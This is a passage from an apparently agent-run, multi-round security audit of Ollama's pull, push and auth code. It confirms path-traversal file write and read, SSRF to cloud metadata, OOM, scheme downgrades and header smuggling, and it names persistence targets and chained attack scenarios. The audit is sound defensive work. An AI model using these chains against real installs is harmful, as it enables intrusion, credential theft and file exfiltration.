- BUT: if the attacker creates a file named `sha256:evil` directly (not a symlink) in blobs dir, it would be renamed to `sha256-evil` — that's the intended behavior. No external-file rename.
- **Revised verdict**: The symlink attack does NOT succeed because `Walk` does not descend into symlinked directories, and renaming the symlink only moves the symlink. H-05 = FALSE POSITIVE.
- **Tracer verdict on H-05**: UNREACHABLE.

**H-06 (session replay, OLLAMA_AUTH)**
- Probe PH-A-21 already traced this. On HEAD: `api/client.go do()` constructs `chal := method + "," + path + "?ts=" + now`. No server nonce. Server-side verification path needs location.
- Quick trace: `grep OLLAMA_AUTH` and `Sign(` verification — let me defer the full trace; probe PH-A-21 classifies as MEDIUM pending server-side window.
- **Tracer verdict on H-06**: CONFIRMED as design gap; exploitable impact depends on server configuration. MEDIUM.

**H-07 (insecure scheme sticky across redirect)**
- `server/download.go:229-268` — `directURL, err := ... return resp.Location()`. `resp.Location()` returns the URL from the response's Location header. The subsequent loop at 275-307 calls `downloadChunk(inner, directURL, w, part)` for every part. No scheme check.
- `downloadChunk` at line 329-389: `req, _ := http.NewRequestWithContext(ctx, http.MethodGet, directURL.String(), ...)` — uses whatever scheme.
- If the initial request was HTTPS but the registry responded with `Location: http://cdn.attacker/...`, all subsequent Range requests go over HTTP. Hash check detects content mismatch but `.tmp` persists. If attacker also serves correct content, downgrade succeeds silently.
- **Tracer verdict on H-07**: CONFIRMED — MEDIUM (scheme integrity violation; real exploitation narrow).

---

#### Aggregate status after tracing

| H-ID | Tracer Status | Primary sink | Attacker position |
|------|---------------|--------------|-------------------|
| H-00.01 | REACHABLE — arbitrary-dir-create + partial .tmp persistence | `x/imagegen/transfer/download.go:213-247` | malicious registry |
| H-00.02 | REACHABLE | `server/download.go:478`, `server/images.go:658` | malicious registry + prior pull / local co-tenant |
| H-00.03 | REACHABLE | `server/images.go:864` | any network client of `/api/pull` |
| H-00.04 | REACHABLE | `server/images.go:864` + `server/auth.go:81` | malicious registry |
| H-00.05 | REACHABLE | `x/imagegen/transfer/upload.go:181` via stored manifest | malicious registry + user push |
| H-00.06 | REACHABLE | `server/auth.go:60` | MITM / malicious registry |
| H-00.07 | REACHABLE | `x/imagegen/manifest/manifest.go:101` + callers | malicious registry (writes manifest) + imagegen dispatch |
| H-00.08 | REACHABLE | `x/create/create.go:102,158` | malicious registry (writes manifest) + IsSafetensors/IsImageGen/GetArch dispatch |
| H-00.09 | REACHABLE (behind `OLLAMA_EXPERIMENT=client2`) | `server/internal/registry/server.go:264` | network; experiment flag |
| H-00.10 | REACHABLE — DoS | `server/download.go:329-389` | MITM CDN |
| H-00.11 | REACHABLE — clean empty-file write | `x/imagegen/transfer/download.go:241-266` | malicious registry |
| H-00.12 | REACHABLE | `server/download.go:265-268` | MITM at redirect |
| H-00.13 | REACHABLE | `server/images.go:995-1016` | MITM / malicious registry |
| H-01 | PARTIAL — downgrade; substitution only via H-04 | — | — |
| H-02 | REACHABLE | `upload.go:181` via planted manifest | malicious registry + victim push |
| H-03 | REACHABLE | `server/images.go:995-1016` → signed scope | malicious registry |
| H-04 | REACHABLE | `server/download.go:478` | local co-tenant |
| H-05 | UNREACHABLE — `filepath.Walk` does not follow symlinks to dirs | — | — |
| H-06 | REACHABLE as design gap | `api/client.go do()` | network observer |
| H-07 | REACHABLE — DoS + downgrade | `server/download.go:229-268` | MITM at redirect |


---

## Round 3 -- Challenge

Round opened: 2026-04-17T03:30:00Z
Directed to: advocate-01

### [ADVOCATE] Defense Briefs -- 2026-04-17T03:32:00Z

Examining every REACHABLE/PARTIAL hypothesis for blocking protections, framework defenses, gated preconditions, and FP pattern matches.

#### H-00.01 — pullWithTransfer digestToPath arbitrary write

**Protections searched**:
1. Input validation at API entry — `POST /api/pull` routes through `server/routes.go:PullHandler` → `PullModel`. The manifest response is fetched from attacker registry. Body validation in `pullModelManifest` uses `json.Unmarshal` into `manifest.Manifest` struct; this does NOT validate `Layer.Digest` against a regex.
2. Layer struct tags / UnmarshalJSON — checked `manifest/layer.go:12-19` — no custom UnmarshalJSON, no struct-tag validation.
3. `hasTensorLayers` guard — `server/images.go:633` dispatches to `pullWithTransfer` only when at least one layer has `MediaTypeImageTensor`. Attacker adds one trivial tensor layer; gate passes.
4. `manifest.BlobsPath` — NOT called in `pullWithTransfer` or `x/imagegen/transfer/*` paths. Only called for `destDir` with empty string argument.
5. `digestToPath` internal sanity — `x/imagegen/transfer/transfer.go:164-170` — only reformats `sha256:` to `sha256-`; no `filepath.IsLocal`, no regex.
6. `os.MkdirAll(filepath.Dir(dest), 0o755)` at `download.go:215` — CREATES arbitrary directories as side effect, not a protection.
7. OS-level permissions — the ollama service runs as `ollama` user (systemd default); cannot write to root-owned paths like `/etc/cron.d/` unless there's a group-writable intermediate. BUT: user-installed ollama runs as the user, so `~/.ssh/authorized_keys`, `~/.bashrc`, `~/.local/share/systemd/user/*` are all writable and gives RCE via user-level persistence. For systemd service install on Ubuntu, `/var/lib/ollama/` is the data dir — ollama user has write; NOT root paths. But there's still `~ollama/.bashrc` etc.
8. File type check at sink — none. `os.Create` is called directly.
9. Framework middleware — gin middleware on `/api/pull` does not validate manifest content (arrives from upstream registry, not from client).

**Defense analysis**: No blocking protection found. Attacker wins.

**FP pattern check**: does this require the attacker to host and serve an OCI manifest from a reachable registry? Yes, but this is the ollama pull threat model (user types `ollama pull evil.com/foo`). Standard.

**Devil's counter-argument**: "The user has to type the registry URL. That's social engineering." — Response: typosquat attack surface on `ollama pull` is documented; `ollama pull ggml-ai/foo` vs `ollama pull gglm-ai/foo` is easy to miss. Also, `ollama pull` invocation can be triggered by automation (CI, docker-compose).

**Severity calibration**: Starts HIGH (remote, trust boundary). Upgrade to CRITICAL gated by: (a) does it really achieve code execution? — on user install, `~/.bashrc` or `~/.config/systemd/user/` drops are reliable RCE; on service install, `/var/lib/ollama/` base limits targets but `~ollama/` is still writable for persistence. Confirmed CRITICAL.

**Advocate verdict on H-00.01**: CANNOT DISPROVE. Severity CRITICAL.

#### H-00.02 / H-04 — size-only / existence-only cache-hit

**Protections searched**:
1. `verifyBlob` at `server/images.go:1030` — CALLED inside `PullModel` loop at line 661 ONLY if `skipVerify[digest]` is false. Line 652: `skipVerify[layer.Digest] = cacheHit`. So cacheHit bypasses verifyBlob.
2. Does anything else hash the blob before use? — `Layer.Open()` at `manifest/layer.go:108-119` just opens the file. llama.cpp loads bytes as-is. No.
3. FS ACLs on blob dir — default single-user install has blob dir as user-owned `0700` parent `.ollama` dir (mode `0755` on blobs). But let me verify.

   `manifest/paths.go:19` and `:56` — both `os.MkdirAll(..., 0o755)`. Blobs dir is world-readable and group-accessible. Not world-writable (umask-dependent), but on shared dev hosts with umask 002, other group members can write.
4. Did a prior fix ever hash-check on cache-hit? Checking git log for commits touching `server/download.go:478` area.
5. Is this the "known-good" pattern? — Docker/OCI ecosystem typically verifies blob digest on every pull even if cached. Ollama's choice to skip is non-standard.

**Defense analysis**: Protection deliberately disabled by the `skipVerify` logic. No alternate defense.

**FP pattern check**: the pre-planted-file requirement is real — attacker must actually write the file first. Network attacker alone (H-00.02 pure) doesn't achieve this because `save()` verifies hash before rename. So the REAL exploit path is via H-04 (local co-tenant / shared install) or via H-00.01 (network attacker's traversal-write primitive planting the file somewhere, but the file needs to end up at `blobs/sha256-<target>` which matches the regex — traversal digests from H-00.01 put files at OTHER paths, not at valid `sha256-<digest>` paths in the same dir).

**Correction**: H-00.02 as a pure-network attack is NOT exploitable on HEAD — the `save()` hash check at `transfer/download.go:257` and `downloadBlob` hash check at `server/download.go` BOTH verify bytes before accepting. The cache-hit bypass only matters when a file is ALREADY present. Present by WHOM?
- Scenario A: attacker is local co-tenant (H-04). REALISTIC only in shared-cache configs.
- Scenario B: attacker pulls a legit-looking model that happens to have a blob digest matching the target model's digest. SHA-256 preimage resistance makes this infeasible.
- Scenario C: prior benign pull wrote the file, and it was later corrupted (e.g., disk error). Benign, not adversarial.

**Severity revised**: Cache-hit bypass is real, but the attacker pathway to write the file is narrow. For a single-user default install, there is no realistic attacker. For shared installs (Docker shared volumes, multi-tenant dev boxes), MEDIUM. The probe's original HIGH rating assumed the write primitive was easy — it's not (against HEAD's save() verification).

**Advocate verdict on H-00.02**: MITIGATED in default config; DOWNGRADE to MEDIUM.
**Advocate verdict on H-04**: CANNOT DISPROVE for shared-cache configs. MEDIUM.

#### H-00.03 — /api/pull SSRF

**Protections searched**:
1. Host allowlist — none found for registry hosts; `isValidPart(kindHost)` accepts any dotted hostname.
2. Scheme enforcement — `images.go:615 if n.ProtocolScheme == "http" && !regOpts.Insecure` rejects http only when `Insecure=false`. Attacker passes `"insecure":true`.
3. IMDS blocking — no check for private/link-local IPs.
4. `allowedHostsMiddleware` — checked at `server/routes.go` — this middleware restricts the HOST header of incoming requests (rebinding protection for the LOCAL API server), not outgoing request destinations.
5. `cloudProxyBaseURL` — only used for ollama.com cloud proxy; unrelated.

**Defense analysis**: No blocking protection.

**Devil's argument**: "The /api/pull endpoint is typically on localhost only. An attacker needs to reach the API." — Response: ollama listens on `127.0.0.1:11434` by default, but users frequently set `OLLAMA_HOST=0.0.0.0` for containers, remote dev, etc. Also, SSRF via a malicious webpage hitting the local API via DNS rebinding (allowedHosts may or may not be effective depending on config). And internal services may expose the API.

**Severity calibration**: HIGH — unauthenticated, reachable, meaningful boundary (internal network reachable from ollama process). Error body reflected → IMDS token exfil on AWS/GCP/Azure.

**Advocate verdict on H-00.03**: CANNOT DISPROVE. HIGH.

#### H-00.04 — unbounded io.ReadAll OOM

**Protections searched**:
1. `io.LimitReader` — not used. `http.MaxBytesReader` — not used.
2. Content-Length check — not enforced.
3. Framework limit — gin's `BodyLimit` middleware not applied to outgoing HTTP client responses.
4. Go runtime OOM killer — process-level death, not a protection.

**Defense analysis**: None.

**Severity calibration**: HIGH — one `/api/pull` triggers 2× OOM (token + manifest); unauthenticated; DoS on inference workloads.

**Advocate verdict on H-00.04**: CANNOT DISPROVE. HIGH.

#### H-00.05 / H-02 — pushWithTransfer traversal file read

**Protections searched**:
1. Digest validation on manifest read — `ParseNamedManifest` at `manifest/manifest.go:112` — no layer digest regex.
2. `BlobsPath` call in push — at `server/images.go:806` called with empty string (for srcDir); NOT for per-layer validation.
3. `digestToPath` in upload — raw `strings.Replace`, no validation.
4. `filepath.IsLocal` — not used anywhere in push path.
5. OS-level — `os.Open` follows symlinks, reads any file readable by ollama user.

**Defense analysis**: None.

**Devil's argument**: "User must initiate push to attacker's registry." — Response: users commonly push to mirrors/internal registries after pulling. CI pipelines that mirror pulls. The specific chain: attacker gets victim to `ollama pull evil.com/X` once, then victim (or automated system) `ollama push internal.com/X` — second registry can be attacker-controlled for exfil.

**Severity calibration**: HIGH — arbitrary file read including `/etc/shadow` (if ollama runs as systemd service with CAP_DAC_READ_SEARCH, unlikely) or at minimum `~ollama/.ssh/*`, `/etc/passwd`, `/var/lib/ollama/*`. When combined with H-00.03 SSRF for IMDS → CRITICAL.

**Advocate verdict on H-00.05**: CANNOT DISPROVE. HIGH standalone, CRITICAL chained (H-02).

#### H-00.06 — realm HTTP downgrade

**Protections searched**:
1. Scheme check on `redirectURL` — missing at `server/auth.go:60`.
2. TLS enforcement — `makeRequest` at line 75 honors whatever scheme.
3. Framework default — Go's `http.Client` doesn't enforce HTTPS for outgoing requests.

**Defense analysis**: None.

**Devil's argument**: "Requires active MITM or malicious registry." — Correct. MITM requires traffic-interception capability. Malicious registry requires user to type registry URL. Both realistic.

**Advocate verdict on H-00.06**: CANNOT DISPROVE. HIGH.

#### H-00.07 — imagegen/manifest BlobPath read traversal

**Protections searched**:
1. Regex — none in `BlobPath` at `x/imagegen/manifest/manifest.go:101-105`.
2. `IsLocal` — absent.
3. Caller-level validation — `ReadConfig`, `OpenBlob`, `detectQuantizationFromBlobs` — none check digest charset.
4. Reachability — callers invoked from mlxrunner (`x/mlxrunner/model/root.go`) and `IsSafetensorsModel`/`IsImageGenModel` dispatch in `x/create/create.go`.

**Defense analysis**: None.

**Advocate verdict on H-00.07**: CANNOT DISPROVE. HIGH.

#### H-00.08 — x/create blob path escape

**Protections searched**: same as H-00.07 — none.

**Advocate verdict on H-00.08**: CANNOT DISPROVE. HIGH.

#### H-00.09 — client2 no body size limit

**Protections searched**:
1. gin middleware — skipped by client2 dispatch (this IS the bug).
2. `decodeUserJSON` — uses `json.NewDecoder` which streams; however, consuming stream still reads unlimited bytes.
3. MaxBytesReader — absent.

**Defense analysis**: None; but gated by `OLLAMA_EXPERIMENT=client2` flag.

**Advocate verdict on H-00.09**: CANNOT DISPROVE but preconditioned on experiment flag. MEDIUM.

#### H-00.10 — HTTP 206 Content-Range not validated

**Protections searched**:
1. Status check at `downloadChunk` — let me verify.

Verified: `server/download.go:331-389 downloadChunk` — line 339 `http.DefaultClient.Do(req)` then line 345 `io.CopyN(w, io.TeeReader(resp.Body, part), part.Size-part.Completed.Load())` — NO status code check (not `resp.StatusCode != 206`), NO Content-Range parsing.

**Defense analysis**: none.

**Advocate verdict on H-00.10**: CANNOT DISPROVE — DoS via stuck download. MEDIUM.

#### H-00.11 — empty-file zero-size traversal

**Protections searched**: same as H-00.01 — none.
**Advocate verdict on H-00.11**: CANNOT DISPROVE. MEDIUM (scope limited to empty-file primitive).

#### H-00.12 — HTTPS→HTTP CDN redirect

**Protections searched**:
1. Redirect CheckRedirect function — at `download.go:240-254` — only checks hostname equality, not scheme. Returns `http.ErrUseLastResponse` on cross-host, not error on downgrade.
2. Location header parsing — `resp.Location()` — no scheme validation.
3. Scheme sticky check — absent.

**Advocate verdict on H-00.12 / H-07**: CANNOT DISPROVE. MEDIUM (downgrade) or HIGH (combined with H-00.02 for substitution, but H-00.02 is itself constrained — so MEDIUM).

#### H-00.13 / H-03 — WWW-Authenticate comma-smuggle

**Protections searched**:
1. Standard RFC 7235 parser — not used; custom `getValue`.
2. Stdlib `mime.ParseMediaType` or similar — not used.
3. Scope/service validation at token endpoint — depends on registry server (out of ollama scope).
4. CVE-2025-51471 fix — the fix per advisory was to restrict realm host to match; the getValue parser itself still has the substring-match flaw.

**Defense analysis**: parser flaw confirmed; impact gated by registry token server behavior. Signature confusion guaranteed. Direct token theft depends on downstream server.

**Advocate verdict on H-00.13**: CANNOT DISPROVE. HIGH (parser design flaw) — exploit gated by token server policy.

#### H-01 — network-only persistent substitution

**Advocate evaluation**: Tracer already found this chain is BLOCKED because `save()` verifies hash before rename. Attacker cannot plant the file via the network alone. Real substitution requires H-04.

**Advocate verdict on H-01**: FALSE POSITIVE. Chain incomplete on HEAD.

#### H-05 — fixBlobs symlink rename

**Advocate evaluation**: Tracer found `filepath.Walk` does not descend into symlinked directories (stdlib guarantee). Symlinks to files are reported to the callback but renaming a symlink moves the link itself, not the target.

**Advocate verdict on H-05**: FALSE POSITIVE.

#### H-06 — session replay

**Advocate evaluation**: Design gap real. Exploitation gated by `OLLAMA_AUTH=1` (not a default) and requires network observer. No evidence of OLLAMA_AUTH being production-used.

**Advocate verdict on H-06**: CANNOT DISPROVE as design gap; impact MEDIUM.

#### Summary of Advocate round

| H-ID | Advocate verdict | Blocking protection found? |
|------|------------------|----------------------------|
| H-00.01 | CANNOT DISPROVE — CRITICAL | No |
| H-00.02 | MITIGATED (needs H-04 for write) — MEDIUM | Hash check in save() prevents network-only substitution |
| H-00.03 | CANNOT DISPROVE — HIGH | No |
| H-00.04 | CANNOT DISPROVE — HIGH | No |
| H-00.05 | CANNOT DISPROVE — HIGH | No |
| H-00.06 | CANNOT DISPROVE — HIGH | No |
| H-00.07 | CANNOT DISPROVE — HIGH | No |
| H-00.08 | CANNOT DISPROVE — HIGH | No |
| H-00.09 | Gated by OLLAMA_EXPERIMENT — MEDIUM | No (gate is config-dependent) |
| H-00.10 | CANNOT DISPROVE — MEDIUM (DoS only) | No |
| H-00.11 | CANNOT DISPROVE — MEDIUM | No |
| H-00.12 | CANNOT DISPROVE — MEDIUM | No |
| H-00.13 | CANNOT DISPROVE — HIGH (parser flaw) | No |
| H-01 | FALSE POSITIVE — chain blocked by save() | Yes (save() hash check) |
| H-02 | CANNOT DISPROVE — CRITICAL | No |
| H-03 | CANNOT DISPROVE — MEDIUM | No (downstream server mitigates some impact) |
| H-04 | CANNOT DISPROVE — MEDIUM (shared-cache configs) | No |
| H-05 | FALSE POSITIVE — Walk doesn't follow symlinks | Yes (stdlib) |
| H-06 | CANNOT DISPROVE — MEDIUM | No (design gap) |
| H-07 | CANNOT DISPROVE — MEDIUM | No |


---

## Round 4 -- Synthesis

Round opened: 2026-04-17T03:40:00Z
Synthesizer decides verdicts for each hypothesis, writes finding drafts for VALID entries.

### [SYNTHESIZER] Verdict for H-00.01 -- 2026-04-17T03:40:00Z

**Prosecution summary**: `pullWithTransfer` passes raw `layer.Digest` into `transfer.Blob{Digest}`; `x/imagegen/transfer/transfer.go:165 digestToPath` does raw `strings.Replace`; `x/imagegen/transfer/download.go:213-215` builds path via `filepath.Join(destDir, digestToPath(digest))` + `os.MkdirAll` + `os.Create(tmp)`. No `BlobsPath`, no `IsLocal`, no regex.
**Defense summary**: No blocking protection. Traversal digest creates arbitrary directory tree + `.tmp` file on initial open; `.tmp` persists on context cancel / stall / network error for blobs >= 64 MB.
**Pre-FP Gate**: all checks passed (attacker control = registry-controlled manifest; framework search exhaustive; trust boundary = network; exploitation = attacker on network; ships to production).
**Verdict: VALID**
**Severity: CRITICAL** — Remote unauthenticated reach through `/api/pull`, arbitrary file write under ollama service user; combined with persistence mechanisms (cron, shell rc, systemd user units), achieves RCE. Even without RCE, `.tmp` file creation at arbitrary paths is disk-exhaustion DoS.
**Rationale**: Tracer confirmed end-to-end code path with no intervening sanitizer; Advocate found no blocking protection and confirmed the defense layers (BlobsPath regex, IsLocal) are absent on this specific call chain.
**Finding draft written to**: archon/findings-draft/p8-001-pullwithtransfer-digest-path-traversal.md

### [SYNTHESIZER] Verdict for H-00.02 -- 2026-04-17T03:41:00Z

**Prosecution summary**: `server/download.go:478` cache-hit on bare `os.Stat`; `images.go:652,658` skips `verifyBlob` when `cacheHit=true`.
**Defense summary**: `save()` at transfer/download.go:257 hash-checks before renaming to final path → pure network attacker cannot plant a file of wrong content at the expected digest path. Exploit requires local write access (covered by H-04).
**Pre-FP Gate**: check-1 passed (attacker control of file placement is conditional); check-3 passed (trust boundary = local coexistence in shared-cache configs).
**Verdict: DUPLICATE** of H-04 (which makes the attacker-position realistic).
**Rationale**: Network-only attacker cannot write the cache file. Finding is realized via H-04.

### [SYNTHESIZER] Verdict for H-00.03 -- 2026-04-17T03:42:00Z

**Prosecution summary**: `isValidPart(kindHost)` accepts `169.254.169.254`; `insecure:true` enables HTTP; `pullModelManifest` sends `GET http://target/v2/...`; error body reflected via `fmt.Errorf`.
**Defense summary**: No outbound host allowlist, no IMDS blocking, no private-IP rejection.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: HIGH** — Unauthenticated (reach `/api/pull`), crosses trust boundary (local network / cloud metadata), meaningful impact (IMDS token exfil, internal probing).
**Rationale**: Tracer confirmed; Advocate found no blocking protection.
**Finding draft written to**: archon/findings-draft/p8-002-api-pull-ssrf.md

### [SYNTHESIZER] Verdict for H-00.04 -- 2026-04-17T03:43:00Z

**Prosecution summary**: `server/images.go:864` + `server/auth.go:81` both use unbounded `io.ReadAll`. Single `/api/pull` to attacker registry triggers both.
**Defense summary**: No `LimitReader` / `MaxBytesReader`.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: HIGH** — Unauthenticated remote DoS; 2× OOM per request.
**Rationale**: Direct unbounded-read sinks, no mitigations.
**Finding draft written to**: archon/findings-draft/p8-003-manifest-token-oom.md

### [SYNTHESIZER] Verdict for H-00.05 -- 2026-04-17T03:44:00Z

**Prosecution summary**: `pushWithTransfer` copies raw `layer.Digest` into `transfer.Blob{Digest}`; `upload.go:181 os.Open(filepath.Join(srcDir, digestToPath(digest)))` reads arbitrary file. Manifest on disk contains attacker-controlled digest (persisted by prior `pullWithTransfer`).
**Defense summary**: No validation on manifest read; no `IsLocal` check in push path.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: HIGH** — arbitrary file read of any path readable by ollama user; exfiltrates to attacker registry.
**Rationale**: Confirmed end-to-end in both Tracer and Advocate. Chain requires `pull` followed by `push` of same model but both are normal user API operations.
**Finding draft written to**: archon/findings-draft/p8-004-pushwithtransfer-traversal-read.md

### [SYNTHESIZER] Verdict for H-00.06 -- 2026-04-17T03:45:00Z

**Prosecution summary**: `server/auth.go:60` only checks `redirectURL.Host != originalHost` — no scheme check. Realm `http://registry.ollama.ai/token` passes and sends ed25519 signed Authorization over plaintext.
**Defense summary**: None.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: HIGH** — Authentication downgrade; MITM on HTTP segment captures signature; facilitates token theft / replay.
**Rationale**: One-line fix available (`redirectURL.Scheme == "https"` assertion); no mitigations on HEAD.
**Finding draft written to**: archon/findings-draft/p8-005-realm-http-downgrade.md

### [SYNTHESIZER] Verdict for H-00.07 -- 2026-04-17T03:46:00Z

**Prosecution summary**: `x/imagegen/manifest/manifest.go:101 BlobPath` raw `strings.Replace`; callers `ReadConfig`, `OpenBlob`, `detectQuantizationFromBlobs` are arbitrary-file-read sinks.
**Defense summary**: None.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: HIGH** — Arbitrary file read from manifest digest; reachable via imagegen pull + subsequent inference.
**Rationale**: Multiple read sinks confirmed by Tracer; Advocate found no blocking check.
**Finding draft written to**: archon/findings-draft/p8-006-imagegen-blobpath-traversal.md

### [SYNTHESIZER] Verdict for H-00.08 -- 2026-04-17T03:47:00Z

**Prosecution summary**: `x/create/create.go:102-105, 157-163` same `strings.Replace` pattern; `loadModelConfig`, `GetModelArchitecture`, and dispatch helpers (`IsSafetensorsModel` etc.) call `os.ReadFile(blobPath)`.
**Defense summary**: None.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: HIGH** — Arbitrary file read triggered by normal model-dispatch routines.
**Rationale**: Confirmed independently of H-00.07 (different file); shares root cause (raw strings.Replace).
**Finding draft written to**: archon/findings-draft/p8-007-xcreate-blobpath-traversal.md

### [SYNTHESIZER] Verdict for H-00.09 -- 2026-04-17T03:48:00Z

**Prosecution summary**: `OLLAMA_EXPERIMENT=client2` dispatches `handlePull` via `server/internal/registry/server.go:264`; `decodeUserJSON` reads unbounded body.
**Defense summary**: Gated by experiment flag; not default.
**Pre-FP Gate**: check-4 PARTIAL — requires non-default config. Documented as behind an opt-in experimental flag.
**Verdict: VALID**
**Severity: MEDIUM** — DoS behind experiment flag.
**Rationale**: Real sink; reduced severity due to flag.
**Finding draft written to**: archon/findings-draft/p8-008-client2-unbounded-body.md

### [SYNTHESIZER] Verdict for H-00.10 -- 2026-04-17T03:49:00Z

**Prosecution summary**: `server/download.go:331-389 downloadChunk` sends Range request but does not validate that response is 206 or that `Content-Range` matches requested range; `io.CopyN` unconditionally copies `part.Size - completed` bytes from response body into the part's file slot.
**Defense summary**: None.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: MEDIUM** — Stuck-download DoS; hash mismatch detected (no silent content substitution) but `.tmp`/partial persists, forcing manual cleanup.
**Rationale**: Direct bug; impact is DoS (not silent corruption) because hash still checked.
**Finding draft written to**: archon/findings-draft/p8-009-content-range-not-validated.md

### [SYNTHESIZER] Verdict for H-00.11 -- 2026-04-17T03:50:00Z

**Prosecution summary**: Empty-hash digest (`sha256:e3b0c44298fc...`) with `size=0` and traversal path writes a clean empty file at arbitrary path (no `.tmp` residue).
**Defense summary**: None.
**Pre-FP Gate**: all checks passed.
**Verdict: DUPLICATE** of H-00.01 (same primitive; weaker impact).
**Rationale**: Already covered by the traversal-write finding; emit as a variant/sub-case in the H-00.01 draft's reproduction steps.

### [SYNTHESIZER] Verdict for H-00.12 -- 2026-04-17T03:51:00Z

**Prosecution summary**: `server/download.go:265-268 resp.Location()` returned URL used for all subsequent chunks; no scheme validation; blob bytes travel HTTP.
**Defense summary**: Hash check detects content mismatch but `.tmp` persists (H-00.10 variant).
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: MEDIUM** — Scheme integrity violation, DoS via stuck downloads, MITM-readable bytes.
**Rationale**: No mitigations.
**Finding draft written to**: archon/findings-draft/p8-010-cdn-scheme-downgrade.md

### [SYNTHESIZER] Verdict for H-00.13 -- 2026-04-17T03:52:00Z

**Prosecution summary**: `server/images.go:995-1016 getValue` finds first `key=` substring without structural parsing; realm value containing `service=X,scope=Y` smuggles values into Service/Scope fields used in signed token request.
**Defense summary**: None; Advocate confirmed parser flaw.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: HIGH** — Signature/scope confusion; revives CVE-2025-51471 class.
**Rationale**: Parser design flaw — a properly-designed header parser would tokenize by structure rather than substring-search.
**Finding draft written to**: archon/findings-draft/p8-011-wwwauth-parser-smuggle.md

### [SYNTHESIZER] Verdict for H-01 -- 2026-04-17T03:53:00Z

**Prosecution summary**: Chain of H-00.01 + H-00.02.
**Defense summary**: `save()` hash verification at `transfer/download.go:257` blocks network-only substitution; attacker cannot write a file of wrong content to the expected-digest path via `pullWithTransfer`.
**Pre-FP Gate**: check-1 FAILED — attacker control of placement is not achievable over network alone.
**Verdict: FALSE POSITIVE**
**Rationale**: Chain incomplete on HEAD. Realized via H-04 instead.

### [SYNTHESIZER] Verdict for H-02 -- 2026-04-17T03:54:00Z

**Prosecution summary**: Chain of H-00.03 (SSRF) + H-00.05 (push read) → full egress arbitrary-file-read with no prior credentials.
**Defense summary**: Requires victim to push after pull — realistic in CI/mirror workflows.
**Pre-FP Gate**: all checks passed.
**Verdict: VALID**
**Severity: CRITICAL** — Unauthenticated attacker chains SSRF (obtain cloud creds via IMDS) + push-read (exfiltrate local files) with zero starting credentials.
**Rationale**: Multiplicative impact of two HIGH findings; zero-cred → cloud creds + file exfil.
**Finding draft written to**: archon/findings-draft/p8-012-ssrf-push-chain-full-egress.md

### [SYNTHESIZER] Verdict for H-03 -- 2026-04-17T03:55:00Z

**Prosecution summary**: Comma-smuggle in WWW-Authenticate realm permits signed scope/service to be smuggled; downstream token server may grant unexpected scope.
**Defense summary**: Impact gated by registry token server policy; signature confusion guaranteed.
**Pre-FP Gate**: all passed.
**Verdict: DUPLICATE** of H-00.13 (same root; H-00.13 is the primary finding; H-03 is the exploit scenario recorded in repro).
**Rationale**: Merge into H-00.13 draft's impact section.

### [SYNTHESIZER] Verdict for H-04 -- 2026-04-17T03:56:00Z

**Prosecution summary**: On shared-cache installs (Docker shared volume, NFS home, CI cache), local co-tenant pre-writes `blobs/sha256-<popular-digest>` of correct content size; victim's `ollama pull` cache-hits on bare `os.Stat` → `verifyBlob` skipped → malicious weights served.
**Defense summary**: Default single-user install has mode 0755 on blobs dir but user-owned; exploit requires multi-writer access. Not default.
**Pre-FP Gate**: check-4 PARTIAL (requires non-default shared-access config).
**Verdict: VALID**
**Severity: MEDIUM** — Local privilege escalation / model substitution on shared installs.
**Rationale**: Real sink; attacker position gated by deployment model.
**Finding draft written to**: archon/findings-draft/p8-013-cache-hit-no-hash-verify.md

### [SYNTHESIZER] Verdict for H-05 -- 2026-04-17T03:57:00Z

**Prosecution summary**: fixBlobs uses `filepath.Walk` and might rename external files via planted symlinks.
**Defense summary**: `filepath.Walk` does not descend into symlinked directories; renaming a symlink entry moves the link, not its target.
**Verdict: FALSE POSITIVE**
**Rationale**: Stdlib semantics prevent the attack.

### [SYNTHESIZER] Verdict for H-06 -- 2026-04-17T03:58:00Z

**Prosecution summary**: `api/client.go do()` constructs signing challenge without server-supplied nonce → replay within timestamp tolerance.
**Defense summary**: Gated by `OLLAMA_AUTH=1` (non-default) and requires network observer.
**Pre-FP Gate**: check-4 PARTIAL (non-default config).
**Verdict: VALID**
**Severity: MEDIUM** — Design gap in auth protocol; exploit requires OLLAMA_AUTH + MITM.
**Rationale**: Real gap; low realistic impact.
**Finding draft written to**: archon/findings-draft/p8-014-session-replay-no-nonce.md

### [SYNTHESIZER] Verdict for H-07 -- 2026-04-17T03:59:00Z

**Prosecution summary**: `blobDownload.Prepare` stores redirected `directURL` from `resp.Location()` without scheme validation; HTTP CDN URL used for all chunks; same root as H-00.12.
**Verdict: DUPLICATE** of H-00.12.
**Rationale**: Identical root; merge.

---

## Round 5 -- Tracer Deep Verification

Round opened: 2026-04-17T06:30:00Z
Directed to: tracer-01

### [TRACER] Evidence Verification and Extension -- 2026-04-17T06:30:00Z

**Purpose**: The Round 2 tracer block contains several imprecise claims. This block provides exact HEAD (`57653b8e`) file:line verification for every code path referenced by the Synthesizer's verdicts, corrects inaccuracies in the prior tracer entry, and extends evidence for the three hypotheses the Synthesizer marked VALID that needed deeper code citation.

**CodeQL artifacts consulted**: `archon/codeql-artifacts/call-graph-slices.json`, `archon/codeql-artifacts/flow-paths-all-severities.md`, `archon/codeql-artifacts/entry-points.json`

---

### [TRACER] Evidence for H-00.01 -- 2026-04-17T06:31:00Z

**Reachability: REACHABLE**

Code path:
1. `server/routes.go` -- `PullHandler` → `PullModel(ctx, req.Name, &regOpts, fn)`
2. `server/images.go:596-638` -- `PullModel`: `n := model.ParseName(name)` at line 597; `pullModelManifest(ctx, n, regOpts)` at line 621; `hasTensorLayers(layers)` at line 633 returns true when any layer has `layer.MediaType == manifest.MediaTypeImageTensor` (line 712-717); dispatches to `pullWithTransfer` at line 634
3. `server/images.go:722-728` -- `pullWithTransfer`: `blobs[i] = transfer.Blob{Digest: layer.Digest, Size: layer.Size}` -- the attacker-controlled `layer.Digest` value is copied directly with no validation; `manifest.BlobsPath` is called only at line 730 with empty string to obtain the blobs directory
